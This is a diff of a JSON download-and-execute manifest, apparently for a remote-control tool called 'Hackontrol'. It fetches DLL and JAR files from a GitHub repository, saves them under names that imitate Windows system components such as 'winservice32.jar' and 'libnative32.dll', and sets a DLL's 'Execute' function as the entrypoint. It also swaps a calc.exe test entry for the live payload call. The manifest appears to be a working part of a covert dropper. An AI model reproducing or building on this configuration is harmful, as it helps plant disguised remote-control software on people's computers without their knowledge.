@@ -11,23 +11,21 @@
 			"sha512": "9c0253ba2bd56d2eb2ac81d1fdf5c49833c4add6ba51229f9efcaff309bd859657c7601805b39da39f5ca8e574fbf96d587f0072d700c81f8322e45aeda32cb7"
 		},
 		{
+			"file": "libnative32.dll",
+			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libnative32.dll",
+			"sha512": "3d766626a55a5637f6c15ac7e192940f8f58b913f9f2f49064dfda344c352cf5be5b22e34349c0d79ac507ed860aef9ed4488c71d3399a7de7bf08f06a50dc3f"
+		},
+		{
 			"file": "winservice32.jar",
 			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.jar",
 			"sha512": "d339268b887a0bbfcb4ef3467e93cfeb8355ae8322eb449c9d6ba5e1f4120d3e5762cfbc6e3c7e5b05f766625a46fc17929be1aa94bdd992ffc9d5500657bf59"
 		}
 	],
 
-	"entrypoint": [
-		{
-			"format": "dll",
-			"file": "libruntime32.dll",
-			"function": "Execute",
-			"join": true
-		},
-		{
-			"format": "exe",
-			"file": "C:\\Windows\\System32\\calc.exe",
-			"absolute": true
-		}
-	]
+	"entrypoint": {
+		"format": "dll",
+		"file": "libruntime32.dll",
+		"function": "Execute",
+		"join": true
+	}
 }
